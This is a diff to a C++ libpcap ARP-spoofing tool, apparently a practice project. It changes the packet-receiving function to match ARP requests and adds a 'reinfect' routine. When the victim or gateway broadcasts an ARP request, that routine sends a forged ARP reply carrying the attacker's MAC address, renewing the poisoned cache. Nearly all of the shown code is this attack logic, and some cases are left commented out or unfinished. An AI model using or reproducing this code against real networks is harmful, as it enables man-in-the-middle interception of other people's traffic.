@@ -34,28 +34,28 @@ void sendArp(int mode, pcap_t *handle, Mac ether_dmac, Mac ether_smac,
 	}
 }
 
-EthArpPacket* receiveArp(pcap_t* handle, Ip src_ip, Ip dst_ip)
+EthArpPacket* receiveArp(int mode, pcap_t* handle, Ip src_ip, Ip dst_ip)
 {
 	while (true)
 		{
 			struct pcap_pkthdr *header;
-			const u_char *reply_packet;
-			int result = pcap_next_ex(handle, &header, &reply_packet);
+			const u_char *arp_packet;
+			int result = pcap_next_ex(handle, &header, &arp_packet);
 			if (result != 1)
 			{
 				continue;
 			}
-			EthArpPacket *reply = (EthArpPacket *)reply_packet;
+			EthArpPacket *arp = (EthArpPacket *)arp_packet;
 
-			if (ntohs(reply->eth_.type_) == EthHdr::Arp && ntohs(reply->arp_.op_) == ArpHdr::Reply &&
-				reply->arp_.sip_ == Ip(htonl(src_ip)) && reply->arp_.tip_ == Ip(htonl(dst_ip)))
+			if (ntohs(arp->eth_.type_) == EthHdr::Arp && ntohs(arp->arp_.op_) == mode &&
+				arp->arp_.sip_ == Ip(htonl(src_ip)) && arp->arp_.tip_ == Ip(htonl(dst_ip)))
 			{
 				printf("\n\n------------------------------\n");
 				printf("Arp Packet captured..\n");
 				printf("from %s...\n", std::string(src_ip).data());
 				printf("to %s...", std::string(dst_ip).data());
 				printf("\n------------------------------\n\n\n");
-				return reply;
+				return arp;
 			}
 		}
 }
@@ -64,23 +64,19 @@ void getSenderMac(pcap_t* handle, Mac src_mac, Ip src_ip, char* dst_mac, Ip arp_
 {
 	sendArp(ArpHdr::Request, handle, Mac("ff:ff:ff:ff:ff:ff"), Mac(src_mac),
 		 Mac(src_mac), Ip(src_ip), Mac("00:00:00:00:00:00"), Ip(arp_tip));
-
-	strcpy(dst_mac,std::string(receiveArp(handle, Ip(arp_tip), Ip(src_ip))->arp_.smac_).c_str());
+	
+	strcpy(dst_mac,std::string(receiveArp(ArpHdr::Reply, handle, Ip(arp_tip), Ip(src_ip))->arp_.smac_).c_str());
+	return;
 }
 
-void reinfectCase1(pcap_t* handle)
+int reinfect(pcap_t* handle, char* send_ip, char* tar_ip)
 {
-	// receiveArp(handle)
-}
-
-void reinfectCase2(pcap_t* handle)
-{
-
-}
-
-void reinfectCase3(pcap_t* handle)
-{
-
+	// printf("dmac: %s\n",std::string(receiveArp(ArpHdr::Request, handle, Ip(send_ip), Ip(tar_ip))->eth_.dmac_).c_str());
+	if ( strcmp(std::string(receiveArp(ArpHdr::Request, handle, Ip(send_ip), Ip(tar_ip))->eth_.dmac_).c_str(),"FF:FF:FF:FF:FF:FF") == 0)
+	{
+		return 1;
+	}
+	return 0;
 }
 
 int main(int argc, char *argv[])
@@ -144,11 +140,17 @@ int main(int argc, char *argv[])
 
 
 		// Case #1 : sender broadcasts arp request packet (to get gateway's mac)
-		reinfectCase1(handle);
+		// if( reinfect(handle, send_ip, tar_ip) == 1 )
+		// {
+		// 	sendArp(ArpHdr::Reply, handle, Mac(send_mac), Mac(send_mac), Mac(att_mac), Ip(tar_ip), Mac(send_mac), Ip(send_ip));
+		// }
 		// Case #2 : gateway broadcasts arp request packet (to get sender's mac)
-		reinfectCase2(handle);
+		if ( reinfect(handle, tar_ip, send_ip) == 1)
+		{
+			sendArp(ArpHdr::Reply, handle, Mac(send_mac), Mac(send_mac), Mac(att_mac), Ip(tar_ip), Mac(send_mac), Ip(send_ip));
+		}
 		// Case #3 : gateway broadcasts arp request (to get david(other one)'s mac)
-		reinfectCase3(handle);
+		// reinfect(handle, tar_ip, );
 
 
 		pcap_close(handle);
